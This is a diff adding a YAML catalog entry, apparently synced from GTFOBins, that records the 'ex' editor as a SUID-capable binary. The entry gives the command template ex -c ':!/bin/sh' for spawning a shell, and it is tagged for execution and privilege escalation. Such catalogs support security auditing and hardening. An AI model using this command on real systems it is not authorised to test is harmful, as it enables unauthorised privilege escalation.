@@ -1,0 +1,24 @@
+id: gtfobins/ex/shell/suid
+type: binary
+platform: linux
+name: ex
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: ex -c ':!/bin/sh'
+references:
+- https://gtfobins.github.io/gtfobins/ex/
+tags:
+- linux
+- unix
+- gtfobins
